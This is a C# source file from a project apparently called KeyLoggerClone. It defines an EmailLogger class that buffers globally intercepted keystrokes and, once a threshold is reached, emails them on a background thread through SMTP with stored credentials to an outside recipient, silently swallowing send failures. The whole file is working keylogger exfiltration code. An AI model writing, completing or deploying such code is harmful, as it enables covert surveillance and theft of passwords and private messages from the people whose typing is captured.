using System;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using KeyLoggerClone.Core;
using KeyLoggerClone.Formatters;

namespace KeyLoggerClone.Loggers
{
    /// <summary>
    /// Buffers intercepted key events and sends them asynchronously to a recipient email 
    /// using SMTP credentials on a background thread.
    /// </summary>
    public class EmailLogger : BaseLogger
    {
        private readonly string _smtpHost;
        private readonly int _smtpPort;
        private readonly string _senderEmail;
        private readonly string _senderPassword;
        private readonly string _recipientEmail;
        private readonly bool _enableSsl;

        private readonly StringBuilder _buffer = new StringBuilder();
        private readonly int _bufferThreshold;

        public EmailLogger(
            string smtpHost,
            int smtpPort,
            string senderEmail,
            string senderPassword,
            string recipientEmail,
            bool enableSsl,
            IKeyFormatter formatter,
            int bufferThreshold = 200) : base(formatter)
        {
            _smtpHost = smtpHost;
            _smtpPort = smtpPort;
            _senderEmail = senderEmail;
            _senderPassword = senderPassword;
            _recipientEmail = recipientEmail;
            _enableSsl = enableSsl;
            _bufferThreshold = bufferThreshold;
        }

        protected override void Write(string formattedKey)
        {
            _buffer.Append(formattedKey);

            // If buffered keystrokes exceed threshold, flush asynchronously
            if (_buffer.Length >= _bufferThreshold)
            {
                Flush();
            }
        }

        /// <summary>
        /// Flushes the buffered keystrokes by sending them via SMTP in a background task.
        /// </summary>
        public override void Flush()
        {
            string content;
            lock (LockObj)
            {
                if (_buffer.Length == 0) return;
                content = _buffer.ToString();
                _buffer.Clear();
            }

            // Run asynchronously in a background Task to avoid freezing the system keyboard input thread
            Task.Run(() => SendEmailInternal(content));
        }

        private void SendEmailInternal(string content)
        {
            try
            {
                using (var mail = new MailMessage())
                {
                    mail.From = new MailAddress(_senderEmail);
                    mail.To.Add(_recipientEmail);
                    mail.Subject = $"Keylogger Interception Logs - {DateTime.Now:yyyy-MM-dd HH:mm:ss}";
                    mail.Body = $"The following keystrokes were intercepted globally:\n\n{content}";
                    mail.IsBodyHtml = false;

                    using (var smtp = new SmtpClient(_smtpHost, _smtpPort))
                    {
                        smtp.Credentials = new NetworkCredential(_senderEmail, _senderPassword);
                        smtp.EnableSsl = _enableSsl;
                        smtp.Send(mail);
                    }
                }
            }
            catch (Exception ex)
            {
                // Log failure to debug output stream to prevent application crash on network timeout
                System.Diagnostics.Debug.WriteLine($"[EmailLogger] Failed to transmit email: {ex.Message}");
            }
        }
    }
}
